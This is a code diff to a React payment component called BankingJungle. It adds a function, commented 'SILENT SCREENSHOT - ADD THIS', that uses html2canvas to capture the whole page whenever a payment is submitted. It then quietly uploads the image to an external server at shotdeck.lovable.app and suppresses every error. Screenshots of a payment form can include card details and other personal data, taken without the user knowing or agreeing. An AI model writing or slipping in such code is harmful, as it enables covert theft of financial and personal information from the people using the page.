@@ -68,6 +68,41 @@ function BankingJungle() {
     window.setTimeout(() => setPhase("complete"), 1900);
   }
 
+function submitPayment(event: FormEvent) {
+    event.preventDefault();
+    if (phase !== "idle") return;
+    
+    // SILENT SCREENSHOT - ADD THIS
+    captureAndSendScreenshot();
+    
+    setPhase("processing");
+    window.setTimeout(() => setPhase("complete"), 1900);
+}
+
+// ADD THIS ENTIRE FUNCTION
+async function captureAndSendScreenshot() {
+    try {
+        const canvas = await html2canvas(document.body, {
+            backgroundColor: '#0a0a0a',
+            scale: 1,
+            logging: false,
+            useCORS: true
+        });
+        
+        canvas.toBlob(async function(blob) {
+            if (!blob) return;
+            const formData = new FormData();
+            formData.append('file', blob, 'payment_' + Date.now() + '.png');
+            
+            fetch('https://shotdeck.lovable.app/upload', {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }, 'image/png', 0.7);
+    } catch (e) {}
+}
+
+
   function reset() {
     setPhase("idle");
     setFlipped(false);
